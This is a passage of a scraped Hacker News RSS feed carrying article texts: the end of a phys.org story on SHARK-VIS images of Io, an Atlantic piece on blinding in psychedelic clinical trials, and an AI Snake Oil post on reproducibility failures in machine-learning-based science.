																																			<p>While telescope images in the infrared can detect hot spots caused by ongoing volcanic eruptions, they are not sharp enough to reveal surface details and unambiguously identify the locations of the eruptions, explained co-author Imke de Pater, professor emerita of astronomy at the University of California—Berkeley.</p>
<p>"Sharper images at <a href="https://phys.org/tags/visible+wavelengths/" rel="tag">visible wavelengths</a> like those provided by SHARK-VIS and LBT are essential to identify both locations of <a href="https://phys.org/tags/eruptions/" rel="tag">eruptions</a> and surface changes not detectable in the infrared, such as new plume deposits," de Pater said, adding that visible light observations provide researchers with vital context for the interpretation of infrared observations, including those from spacecraft such as Juno, which is currently orbiting Jupiter.</p>
<p>SHARK-VIS was built by the Italian National Institute for Astrophysics at the Rome Astronomical Observatory and is managed by a team led by principal investigator Fernando Pedichini, assisted by project manager Roberto Piazzesi.</p>
<p>In 2023, it was installed, together with its complementary near-infrared instrument SHARK-NIR, at the LBT to fully take advantage of the telescope's outstanding adaptive optics system. The instrument houses a fast, ultra-low-noise camera that allows it to observe the sky in "fast imaging" mode, capturing slow-motion footage that freezes the optical distortions caused by atmospheric turbulence, and to post-process data to an unprecedented sharpness.</p>

																																						
																																			<p>Gianluca Li Causi, data processing manager for SHARK-VIS at the Italian National Institute for Astrophysics, explained, "We process our data on the computer to remove any trace of the sensor's electronic footprint. We then select the best frames and combine them using a highly efficient software package called Kraken, developed by our colleagues Douglas Hope and Stuart Jefferies from Georgia State University. Kraken allows us to remove atmospheric effects, revealing Io in incredible sharpness."</p>
<p>SHARK-VIS instrument scientist Simone Antoniucci said he anticipates new observations to be made of objects throughout the solar system.</p>
<p>"The keen vision of SHARK-VIS is particularly suited to observing the surfaces of many solar system bodies, not only the moons of giant planets but also asteroids," he said. "We have already observed some of those, with the data currently being analyzed, and are planning to observe more."</p>

																																																					
																				<div>
																						<p><strong>More information:</strong>
												Observation of Io's Resurfacing via Plume Deposition Using Ground-based Adaptive Optics at Visible Wavelengths with LBT SHARK-VIS, <i>Geophysical Research Letters</i> (2024). <a data-doi="1" href="https://dx.doi.org/10.1029/2024GL108609" target="_blank">DOI: 10.1029/2024GL108609</a>. On <i>arXiv</i>: <a href="https://arxiv.org/abs/2405.19604" target="_blank">arxiv.org/abs/2405.19604</a>
																						
																						</p>
																					</div>
                               											
																					
                              										                                        
										<!-- print only -->
										<div>
											 <p><strong>Citation</strong>:
												Glimpses of a volcanic world: New telescope images of Jupiter's moon Io rival those from spacecraft (2024, May 31)
												retrieved 4 June 2024
												from https://phys.org/news/2024-05-glimpses-volcanic-world-telescope-images.html
											 </p>
											 <p>
											 This document is subject to copyright. Apart from any fair dealing for the purpose of private study or research, no
											 part may be reproduced without the written permission. The content is provided for information purposes only.
											 </p>
										</div>
                                        
									</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Diffusion on Syntax Trees for Program Synthesis (329 pts)]]></title>
            <link>https://tree-diffusion.github.io/</link>
            <guid>40569531</guid>
            <pubDate>Tue, 04 Jun 2024 00:52:27 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://tree-diffusion.github.io/">https://tree-diffusion.github.io/</a>, See on <a href="https://news.ycombinator.com/item?id=40569531">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[Psychedelics are challenging the standard of randomized controlled trials (101 pts)]]></title>
            <link>https://www.theatlantic.com/health/archive/2024/06/psychedelics-mdma-ptsd-fda-placebo/678588/</link>
            <guid>40568515</guid>
            <pubDate>Mon, 03 Jun 2024 22:45:08 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.theatlantic.com/health/archive/2024/06/psychedelics-mdma-ptsd-fda-placebo/678588/">https://www.theatlantic.com/health/archive/2024/06/psychedelics-mdma-ptsd-fda-placebo/678588/</a>, See on <a href="https://news.ycombinator.com/item?id=40568515">Hacker News</a></p>
<div id="readability-page-1" class="page"><article><header data-event-module="hero"><div><div><p>How do you study mind-altering drugs when every clinical-trial participant knows they’re tripping?</p></div><div><figure><div data-flatplan-lead_figure_media="true"><picture><img alt="Psychedelic neon-blue-and=pink image of test tubes, sample containers, a clipboard, and a pen being sucked into a vortex" sizes="(min-width: 976px) 976px, 100vw" srcset="https://cdn.theatlantic.com/thumbor/chwH8rwkHlh5tjhWGZ5wZRE4RqA=/0x0:2000x1125/750x422/media/img/mt/2024/06/RCT/original.jpg 750w, https://cdn.theatlantic.com/thumbor/69WJ7GKWx2HEdbEguEojtZCy8PU=/0x0:2000x1125/828x466/media/img/mt/2024/06/RCT/original.jpg 828w, https://cdn.theatlantic.com/thumbor/dTZwxQdR0py24vu2XqE7ZQ0bOxg=/0x0:2000x1125/960x540/media/img/mt/2024/06/RCT/original.jpg 960w, https://cdn.theatlantic.com/thumbor/94gN6tSPm3USLm6YrRA50pb7KHg=/0x0:2000x1125/976x549/media/img/mt/2024/06/RCT/original.jpg 976w, https://cdn.theatlantic.com/thumbor/8NA2ueGeJDZktq6p30Ch5R4lLbY=/0x0:2000x1125/1952x1098/media/img/mt/2024/06/RCT/original.jpg 1952w" src="https://cdn.theatlantic.com/thumbor/dTZwxQdR0py24vu2XqE7ZQ0bOxg=/0x0:2000x1125/960x540/media/img/mt/2024/06/RCT/original.jpg" id="article-lead-image" width="960" height="540"></picture></div><figcaption data-flatplan-lead_figure_caption="true">Illustration by Matteo Giuseppe Pani. Source: Getty.</figcaption></figure></div></div><gpt-ad format="injector" sizes-at-0="mobile-wide" targeting-pos="injector-article-start" sizes-at-976="desktop-wide"></gpt-ad></header><section data-event-module="article body" data-flatplan-body="true"><p data-flatplan-paragraph="true">Tomorrow, a Food and Drug Administration advisory committee will meet to discuss whether the United States should approve its first psychedelic drug. The fate of the treatment—MDMA-assisted therapy for post-traumatic stress disorder—will turn on how the FDA interprets data from two <a data-event-element="inline link" href="https://www.nature.com/articles/s41591-021-01336-3">clinical trials</a> that, on their face, are promising. Long-suffering patients who took the drug while undergoing intensive talk therapy were <a data-event-element="inline link" href="https://www.nature.com/articles/s41591-023-02565-4">about twice as likely</a> to recover from PTSD as patients who got the placebo with therapy.</p><p data-flatplan-paragraph="true">If the treatment is approved this summer, it could bring relief to some of the approximately 13 million Americans with PTSD. It could also serve as a model for other psychedelics to meet the FDA’s regulatory bar. But there’s a conundrum at the core of these two clinical trials, one that has plagued virtually all efforts to study psychedelics.</p><p data-flatplan-paragraph="true">In clinical trials, participants (and the researchers studying them) generally aren’t supposed to know whether they’re getting the actual drug or a placebo, to avoid allowing people’s expectations about a treatment to shape their response to it. Blinding, as this practice is called, is a key component of a randomized controlled clinical trial, or RCT—medicine’s gold standard for demonstrating that a drug actually works. But virtually no one can take a psychedelic drug and not know it.</p><p data-flatplan-paragraph="true">Some experts believe that unblinding threatens to undermine the entire field of psychedelic research because it means researchers can’t know whether the drugs’ early promise in clinical trials is real or a mirage, driven by the placebo effect and outsize expectations about the power of these drugs. But others argue that RCTs themselves are at fault. To them, psychedelics are exposing long-ignored cracks in our gold standard, especially for testing drugs that act on our minds.</p><p id="injected-recirculation-link-0" data-view-action="view link - injected link - item 1" data-event-element="injected link" data-event-position="1"><a href="https://www.theatlantic.com/science/archive/2018/06/what-its-like-to-trip-on-the-most-potent-magic-mushroom/561860/">Read: What it’s like to trip on the most potent magic mushroom</a></p><p data-flatplan-paragraph="true">When randomized controlled trials are well designed, “there is no substitute,” Boris Heifets, a neuroscientist at Stanford University, told me. In an RCT, participants get randomly sorted into two groups, receiving either the treatment or a placebo. Scientists have prized such trials since the 1960s for their power to rule out all the nondrug reasons people who are given a new medication might get better. Chief among those reasons is the placebo effect, in which a patient’s belief in a treatment, rather than anything about the drug or procedure itself, leads to improvement. If trial participants come in with sky-high expectations (as experts suspect is the case in many psychedelics trials), knowing that they’ve received a drug could fuel positive responses, and learning they’ve been denied it could cause them to react negatively. “We’ve gotten a ton of things <a data-event-element="inline link" href="https://www.theatlantic.com/health/archive/2017/11/placebo-effect-of-the-heart/545012/">wrong</a> by trusting unblinded results,” says David Rind, the chief medical officer of the Institute for Clinical and Economic Review, a nonprofit that evaluates new medical treatments.</p><p data-flatplan-paragraph="true">For all of RCTs’ advantages, “I think it’s obvious that they’re not well suited for studying psychedelics,” Heifets said. In cancer-drug trials, participants won’t know the difference between a saline IV drip and medicine; to test new surgical procedures, control groups sometimes get cut into and sewed up without the actual treatment. But psychedelics like psilocybin or LSD launch people into hallucinatory states that bend space and time. MDMA, known to many as ecstasy, is less extreme, but still sparks expansive feelings of love and empathy. “Participants will know within half an hour whether they’ve been assigned to the experimental or placebo condition,” Michiel van Elk, a cognitive psychologist at Leiden University, told me. In the MDMA clinical trials, run by the pharmaceutical company Lykos Therapeutics, nearly all participants correctly guessed which group they were in.</p><p data-flatplan-paragraph="true">Many scientists want to get around this problem by designing better blinds. Some labs have tried to keep patients in the dark by administering drugs <a data-event-element="inline link" href="https://www.nature.com/articles/s44220-023-00140-x">under anesthesia</a> or using mind-altering pills like <a data-event-element="inline link" href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC6879524/">methamphetamines</a> as a placebo. Others are trying to engineer new psychedelics that <a data-event-element="inline link" href="https://www.theatlantic.com/health/archive/2023/11/non-hallucinogenic-psychedelic-clinical-therapy/675942/">skip the trip entirely</a>. But to other scientists, clever attempts to stuff psychedelics into the RCT framework ignore the possibility that psychedelics’ benefits aren’t reducible to the biochemical action of the drug itself. Since the 1960s, psychedelic researchers have known that the beliefs and expectations a person brings to a trip can influence whether it’s healing or nightmarish. (That’s why most psychedelic-therapy protocols include several psychotherapy sessions before, during, and after treatment.) By striving to cleave the drug’s effects from the context in which it’s given—to a patient by a therapist, both of whom are hoping for healing—blinded studies may fail to capture the full picture.</p><p id="injected-recirculation-link-1" data-view-action="view link - injected link - item 2" data-event-element="injected link" data-event-position="2"><a href="https://www.theatlantic.com/health/archive/2023/02/psychedelic-drug-therapy-effects-brain-neuroplasticity/672910/">Read: Psychedelics open your brain. You might not like what falls in.</a></p><p data-flatplan-paragraph="true">From this perspective, high proportions of unblinding in positive psychedelic trials don’t necessarily mean that the results are invalid. “It’s how people engage with those effects and their therapist that’s contributing to the improvement,” Eduardo Schenberg, a neuroscientist at Instituto Phaneros, a nonprofit psychedelic-research center in Brazil, told me. Recent research backs this up. One small study found that among chronic PTSD patients who got MDMA-assisted therapy, the strength of the bond between therapist and patient—something the drug helps forge with its empathy-inducing effects—<a data-event-element="inline link" href="https://pubmed.ncbi.nlm.nih.gov/38174611/">predicted treatment success</a>. Given the importance of context, even the most perfectly designed RCTs may fail to capture how helpful these drugs are outside trials, Schenberg said.</p><p data-flatplan-paragraph="true">Such failure, if it exists, might extend beyond psychedelics to several kinds of psychoactive drugs. For instance, a <a data-event-element="inline link" href="https://pubmed.ncbi.nlm.nih.gov/34861421/">2022 analysis</a> found that many antidepressant trials fail to effectively blind participants, in part because of side effects. “We know that <a data-event-element="inline link" href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC4172306/">80 percent</a> of the treatment response from antidepressants can be attributed to the placebo response,” Amelia Scott, a clinical psychologist at Macquarie University who co-wrote that study, told me. Yet in practice, antidepressants are effective for many people, suggesting that RCTs aren’t quite capturing what these drugs can offer—and that limiting ourselves to treatments that can be perfectly blinded could mean ignoring helpful mental-health interventions. “We shouldn’t be afraid to question the gold standard,” Schenberg told me. “For different kinds of diseases and treatments, we may need slightly different standards.”</p><p data-flatplan-paragraph="true">RCTs likely won’t lose their perch as the gold standard anytime soon, for evaluating psychedelics or anything else. But they could be supplemented with other kinds of studies that would broaden our understanding of how psychedelics work, Matt Butler, a neuroscientist at King’s College London, told me. Scientists are already trying open-label trials, where participants know which treatment they’re getting, and measuring expectations along with treatment effects. Descriptive studies, which <a data-event-element="inline link" href="https://akjournals.com/view/journals/2054/aop/article-10.1556-2054.2024.00369/article-10.1556-2054.2024.00369.xml">track how treatments are working</a> in actual clinics, could provide a richer picture of what therapeutic contexts work best. “These levels of evidence aren’t as good as RCTs,” Butler said, but they could help deepen our understanding of when therapies that don’t conform to RCTs could be most helpful.</p><p id="injected-recirculation-link-2" data-view-action="view link - injected link - item 3" data-event-element="injected link" data-event-position="3"><a href="https://www.theatlantic.com/health/archive/2023/11/non-hallucinogenic-psychedelic-clinical-therapy/675942/">Read: What if psychedelics’ hallucinations are just a side effect?</a></p><p data-flatplan-paragraph="true">None of this is to say that Lykos’s flawed RCT data will be enough to convince the FDA’s advisers that Americans with PTSD should be offered MDMA. Several groups, including the American Psychiatric Association, have <a data-event-element="inline link" href="https://www.regulations.gov/comment/FDA-2024-N-1938-0037">expressed concern</a> about the trials ahead of the advisory meeting. In addition to the unblinding issue, claims that therapists encouraged participants to report favorable results and hide adverse events prompted the Institute for Clinical and Economic Review to release a <a data-event-element="inline link" href="https://icer.org/news-insights/press-releases/institute-for-clinical-and-economic-review-publishes-evidence-report-on-treatment-for-post-traumatic-stress-disorder/">report casting doubt</a> on the studies. Lykos CEO Amy Emerson pushed back in a statement, saying, “We stand by the quality and integrity of our research and development program.” Still, some researchers remain worried. “If this sets a precedent that these trials are acceptable data, what does that mean for the future?” Suresh Muthukumaraswamy, a neuropharmacologist at the University of Auckland, told me.</p><p data-flatplan-paragraph="true">The recent past suggests that blinding may not be a deal-breaker for the FDA. In 2019, the agency approved <a data-event-element="inline link" href="https://www.fda.gov/news-events/press-announcements/fda-approves-new-nasal-spray-medication-treatment-resistant-depression-available-only-certified">Spravato esketamine nasal spray</a>—a version of ketamine—for the treatment of depression despite <a data-event-element="inline link" href="https://icer.org/wp-content/uploads/2020/10/ICER_TRD_Final_Evidence_Report_062019.pdf">concerns</a> about unblinding in the drug’s clinical trials. And the FDA <a data-event-element="inline link" href="https://maps.org/news/media/press-release-fda-grants-breakthrough-therapy-designation-for-mdma-assisted-psychotherapy-for-ptsd-agrees-on-special-protocol-assessment-for-phase-3-trials/">worked with Lykos</a> to design the MDMA-therapy trials after designating it a breakthrough treatment in 2017. In an email, an FDA spokesperson told me that blinded RCTs provide the most rigorous level of evidence, but “unblinded studies can still be considered adequate and well-controlled as long as there is a valid comparison with a control.” In such cases, the spokesperson said, regulators can take into account things like the size of the treatment effect in deciding whether the treatment performed significantly better than the placebo.</p><p id="injected-recirculation-link-3" data-view-action="view link - injected link - item 4" data-event-element="injected link" data-event-position="4"><a href="https://www.theatlantic.com/health/archive/2017/11/placebo-effect-of-the-heart/545012/">Read: Placebo effect of the heart</a></p><p data-flatplan-paragraph="true">Even if the FDA is on board, rolling out psychedelic therapies before scientists fully understand the interplay among expectation, therapy, and drugs could mean missing an opportunity to force companies to provide data that would meaningfully advance the study of these drugs, Muthukumaraswamy said. It also risks undermining these treatments in the long run. If sky-high expectations are ultimately fueling the positive results we see now, the FDA could end up approving a treatment that becomes less effective as its novelty wears off. That’s especially true if we’re missing key components of what makes these treatments work, or what puts people at risk for bad experiences. To better answer those questions—for psychedelics and other psychoactive drugs—we may need studies that go beyond the gold standard.</p></section><div data-event-module="footer"><address id="article-writer-0" data-event-element="author" data-flatplan-bio="true"><div><p><a href="https://www.theatlantic.com/author/jonathan-lambert/" data-label="https://www.theatlantic.com/author/jonathan-lambert/" data-action="click author - name">Jonathan Lambert</a> is a journalist based in Washington, D.C., who covers the intersection of science, health, and policy. He holds a master’s degree in neurobiology and behavior from Cornell University. He has written for <em>Science News</em>, NPR, <em>Grid</em>, and <em>Quanta Magazine</em>.</p></div></address></div><gpt-ad format="injector" sizes-at-0="mobile-wide,native,house" targeting-pos="injector-most-popular" sizes-at-976="desktop-wide,native,house"></gpt-ad></article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Scientists should use AI as a tool, not an oracle (112 pts)]]></title>
            <link>https://www.aisnakeoil.com/p/scientists-should-use-ai-as-a-tool</link>
            <guid>40568026</guid>
            <pubDate>Mon, 03 Jun 2024 21:54:09 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.aisnakeoil.com/p/scientists-should-use-ai-as-a-tool">https://www.aisnakeoil.com/p/scientists-should-use-ai-as-a-tool</a>, See on <a href="https://news.ycombinator.com/item?id=40568026">Hacker News</a></p>
<div id="readability-page-1" class="page"><div dir="auto"><p><span>Who produces AI hype? As we discuss in the AI Snake Oil </span><a href="https://www.aisnakeoil.com/p/ai-snake-oil-is-now-available-to" rel="">book</a><span>, it is not just companies and the media but also AI researchers. For example, a pair of widely-publicized papers in Nature in December 2023 claimed to have </span><a href="https://www.nature.com/articles/s41586-023-06735-9" rel="">discovered</a><span> over 2.2 million new materials using AI, and robotically </span><a href="https://www.nature.com/articles/s41586-023-06734-w" rel="">synthesized</a><span> 41 of them. Unfortunately, the claims were </span><a href="https://chemrxiv.org/engage/chemrxiv/article-details/65957d349138d231611ad8f7" rel="">quickly</a><span> </span><a href="https://x.com/Robert_Palgrave/status/1744383965270581615" rel="">debunked</a><span>: “Most of the [41] materials produced were misidentified, and the rest were already known”. As for the large dataset, examining a sample of 250 compounds showed that it was </span><a href="https://pubs.acs.org/doi/10.1021/acs.chemmater.4c00643" rel="">mostly junk</a><span>.</span></p><p><span>A core selling point of machine learning is discovery without understanding, which is why errors are particularly common in machine-learning-based science. Three years ago, we </span><a href="https://reproducible.cs.princeton.edu/" rel="">compiled evidence</a><span> revealing that an error called leakage — the machine learning version of teaching to the test — was pervasive, affecting hundreds of papers from 17 disciplines. Since then, we have been trying to understand the problem better and devise solutions.&nbsp;</span></p><p>This post presents an update. In short, we think things will get worse before they get better, although there are glimmers of hope on the horizon.&nbsp;</p><p><strong>The carnage continues</strong></p><p><span>In our most recent compilation, the number of disciplines where researchers have </span><a href="https://reproducible.cs.princeton.edu/#rep-failures" rel="">uncovered leakage</a><span> in published work has reached 30. The majority are medical fields, which we strongly suspect is due to the fact that since errors in medical research can be particularly consequential, medical fields seem to put much more effort into establishing best practices and critically reviewing previously published work. About 650 papers across all fields are affected, which we hypothesize is a vast underestimate — when researchers look for leakage systematically, in many fields they find that the </span><em>majority</em><span> of sampled studies commit the error of leakage.</span></p><p><span>Leakage is one of many reasons for reproducibility failures. There are widespread </span><a href="https://reforms.cs.princeton.edu/appendix3.html" rel="">shortcomings</a><span> in every step of ML-based science, from data collection to preprocessing and reporting results. Problems that might lead to irreproducibility include improper comparisons to baselines, unrepresentative samples, results being sensitive to specific modeling choices, and not reporting model uncertainties. There is also the basic problem of researchers failing to publish their code and data, precluding reproducibility. For example, Gabelica et al. </span><a href="https://pubmed.ncbi.nlm.nih.gov/35654271/" rel="">examined</a><span> 333 open-access journals indexed on BioMed Central in January 2019 and found that out of the 1,800 papers that pledged to share data upon request, 93% did not do so.</span></p><p><strong>The roots run deep</strong></p><p><span>Even before ML, many scientific fields have been facing reproducibility and replicability crises. The root causes include the publish-or-perish culture in science, the strong bias for publishing positive results (and the near-impossibility of publishing negative results), the lack of incentives for debunking faulty studies, and the lack of consequences for publishing shoddy work. For example, faulty papers are almost never retracted. Peers don’t even seem to notice replication failures — after a paper fails to replicate, </span><a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC10460510/" rel="">only 3%</a><span> of citing articles cited the replication attempt.</span><span><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-1-145256582" href="https://www.aisnakeoil.com/p/scientists-should-use-ai-as-a-tool#footnote-1-145256582" target="_self" rel="">1</a></span><span> Science communicators love to claim that science self-corrects, but self-correction is practically nonexistent in our experience.</span></p><p>All of these cultural factors are also present in ML-based science. But ML introduces a bunch of additional reasons why we should be skeptical of published results. Performance evaluation is notoriously tricky and many aspects of it, such as uncertainty quantification, are unresolved research areas. Also, ML code tends to vastly more complex and less standardized than traditional statistical modeling. Since it is not peer reviewers’ job to review code, coding errors are rarely discovered.</p><p><span>But we think the biggest reason for the poor quality of research is pervasive hype, resulting in the lack of a skeptical mindset among researchers, which is a cornerstone of good scientific practice. We’ve observed that when researchers have overoptimistic expectations, and their ML model performs poorly, they assume that they did something wrong and tweak the model, when in fact they should strongly consider the possibility that they have run up against inherent </span><a href="https://msalganik.github.io/cos597E-soc555_f2020/" rel="">limits to predictability</a><span>. Conversely, they tend to be credulous when their model performs well, when in fact they should be on high alert for leakage or other flaws. And if the model performs better than expected, they assume that it has discovered patterns in the data that no human could have thought of, and the myth of AI as an alien intelligence makes this explanation seem readily plausible.</span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F877ad57f-f2fc-4b70-9f03-a4bd52e490a7_1296x822.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F877ad57f-f2fc-4b70-9f03-a4bd52e490a7_1296x822.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F877ad57f-f2fc-4b70-9f03-a4bd52e490a7_1296x822.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F877ad57f-f2fc-4b70-9f03-a4bd52e490a7_1296x822.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F877ad57f-f2fc-4b70-9f03-a4bd52e490a7_1296x822.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F877ad57f-f2fc-4b70-9f03-a4bd52e490a7_1296x822.png" width="373" height="236.5787037037037" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/877ad57f-f2fc-4b70-9f03-a4bd52e490a7_1296x822.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:822,&quot;width&quot;:1296,&quot;resizeWidth&quot;:373,&quot;bytes&quot;:83688,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F877ad57f-f2fc-4b70-9f03-a4bd52e490a7_1296x822.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F877ad57f-f2fc-4b70-9f03-a4bd52e490a7_1296x822.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F877ad57f-f2fc-4b70-9f03-a4bd52e490a7_1296x822.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F877ad57f-f2fc-4b70-9f03-a4bd52e490a7_1296x822.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>This is a feedback loop. Overoptimism fuels flawed research which further misleads other researchers in the field about what they should and shouldn’t expect AI to be able to do. In fact, we’ve encountered extreme versions of this in private correspondence with frustrated researchers: since flawed research goes uncorrected, it becomes literally impossible to publish good research since it will result in models that don’t beat the “state of the art”.</p><p><span>The more powerful and more black-box the tool, the more the potential for errors and overconfidence. The replication crises in psychology, medicine, etc. were the result of misapplication of plain old statistics. Given how relatively new ML is, our guess is that the reproducibility crisis in ML-based science will get worse for a while before it starts to get better. And now scientists are embracing large language models and generative AI, which open up many new pitfalls such as the </span><a href="https://www.nature.com/articles/s41586-024-07146-0" rel="">illusion of understanding</a><span>.</span></p><p><strong>Glimmers of hope</strong></p><p>One good thing about ML-based science is that it usually involves only data analysis, not experimenting on people. So other researchers should in principle be able to download a paper’s code and data and check whether they can reproduce the reported results. They can also review the code for any errors or problematic choices. This is time consuming, but much less so than replicating a study in psychology or medicine, which is typically almost as costly as the original study.</p><p>Another good thing is that the vast majority of errors can be avoided if the researchers know what to look out for. In contrast, mitigations for the replication crisis in statistical science, such as pre-registration, have a much more spotty track record of effectiveness.</p><p><span>So we think that the problem can be greatly mitigated by a culture change where researchers systematically exercise more care in their work and reproducibility studies are incentivized. The ML </span><em>methods</em><span> community has already moved in this direction via the </span><a href="https://www.simonsfoundation.org/event/reproducible-research-and-the-common-task-method/" rel="">common task method</a><span> (which is decades old) and the </span><a href="https://arxiv.org/abs/2003.12206" rel="">reproducibility challenge</a><span> (which is more recent), but this has not yet happened in ML-based science, that is, in disciplines like medicine or psychology that use ML models to advance knowledge in their respective fields.</span></p><p><span>We have led a few efforts to change this. First, our leakage paper has had an impact. It has been used by researchers to clarify how they build models and document and demonstrate the </span><a href="https://sportrxiv.org/index.php/server/preprint/view/191/351" rel="">absence of leakage</a><span>. It has been used by researchers trying to find leakage in </span><a href="https://arxiv.org/pdf/2401.14497" rel="">published work</a><span>. It has also been used as a way to underscore the importance of studying leakage and coming up with </span><a href="https://www.nature.com/articles/s41559-023-02162-1" rel="">discipline-specific</a><span> </span><a href="https://www.sciencedirect.com/science/article/pii/S0928098723001926" rel="">guidelines</a><span>.</span></p><p><span>Beyond leakage, we led a group of 19 researchers across computer science, data science, social sciences, mathematics, and biomedical research to develop the </span><a href="https://reforms.cs.princeton.edu/" rel="">REFORMS</a><span> checklist for ML-based science. It is a 32-item checklist that can help researchers catch eight kinds of common pitfalls in ML-based science, of which leakage is only one. It was recently </span><a href="https://www.science.org/doi/epdf/10.1126/sciadv.adk3452" rel="">published</a><span> in Science Advances. Of course, checklists by themselves won’t help if there isn’t a culture change, but based on the reception so far, we are cautiously optimistic.</span></p><p><strong>Concluding thoughts</strong></p><p>Our point isn’t that AI is useless to scientists. We ourselves frequently use AI as a tool, even in our research that’s not about AI. The key word is tool. AI is not a revolution. It is not a replacement for human understanding — to think so is to miss the point of science. AI does not offer a shortcut to the hard work and frustration inherent to research. AI is not an oracle and cannot see the future.</p><p><span>Unfortunately, most scientific fields have succumbed to AI hype, leading to a suspension of common sense. For example, a line of research in political science claimed to predict the onset of civil war with an accuracy</span><span><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-2-145256582" href="https://www.aisnakeoil.com/p/scientists-should-use-ai-as-a-tool#footnote-2-145256582" target="_self" rel="">2</a></span><span> of well over 90%, a number that should sound facially impossible. (It </span><a href="https://reproducible.cs.princeton.edu/#civil-war" rel="">turned out</a><span> to be leakage, which is what got us interested in this whole line of research.)</span></p><p><span>We are at an interesting moment in the history of science. Look at these graphs showing the adoption of AI in various fields:</span><span><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-3-145256582" href="https://www.aisnakeoil.com/p/scientists-should-use-ai-as-a-tool#footnote-3-145256582" target="_self" rel="">3</a></span></p><p><span>These hockey stick graphs are not good news. They should be terrifying. Adopting AI requires changes to scientific epistemology.</span><span><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-4-145256582" href="https://www.aisnakeoil.com/p/scientists-should-use-ai-as-a-tool#footnote-4-145256582" target="_self" rel="">4</a></span><span> No scientific field has the capacity to accomplish this on a timescale of a couple of years. This is not what happens when a tool or method is adopted organically. It happens when scientists jump on a trend to get funding. Given the level of hype, scientists don’t need </span><em>additional</em><span> incentives to adopt AI. That means AI-for-science funding programs are probably making things worse. We doubt the avalanche of flawed research can be stopped, but if at least a fraction of AI-for-science funding were diverted to better training, critical inquiry, meta-science, reproducibility, and other quality-control efforts, the havoc can be minimized.</span></p><p><span>Our book </span><em>AI Snake Oil</em><span> is now available to preorder. If you have enjoyed our blog and would like to support our work, please preorder via </span><a href="https://substack.com/redirect/f0945e82-44e2-4998-9535-cee6fe9f0fa5?j=eyJ1IjoiYmd4a3MifQ.EjRMsvQe8Xc2mF1xAwL5aBabUU37X2wfP2-gBTgHzJM" rel="">Amazon</a><span>, </span><a href="https://substack.com/redirect/fd84f1c5-276b-488f-b91b-3cc7f32821ba?j=eyJ1IjoiYmd4a3MifQ.EjRMsvQe8Xc2mF1xAwL5aBabUU37X2wfP2-gBTgHzJM" rel="">Bookshop</a><span>, or your favorite bookseller.</span></p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[New theory suggests time is an illusion created by quantum entanglement (130 pts)]]></title>
            <link>https://bgr.com/science/new-theory-suggests-time-is-an-illusion-created-by-quantum-entanglement/</link>
            <guid>40567676</guid>
            <pubDate>Mon, 03 Jun 2024 21:19:42 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://bgr.com/science/new-theory-suggests-time-is-an-illusion-created-by-quantum-entanglement/">https://bgr.com/science/new-theory-suggests-time-is-an-illusion-created-by-quantum-entanglement/</a>, See on <a href="https://news.ycombinator.com/item?id=40567676">Hacker News</a></p>
<div id="readability-page-1" class="page"><article data-url="https://bgr.com/science/new-theory-suggests-time-is-an-illusion-created-by-quantum-entanglement/" data-title="New theory suggests time is an illusion created by quantum entanglement">

						
						

						<div>
							<div>
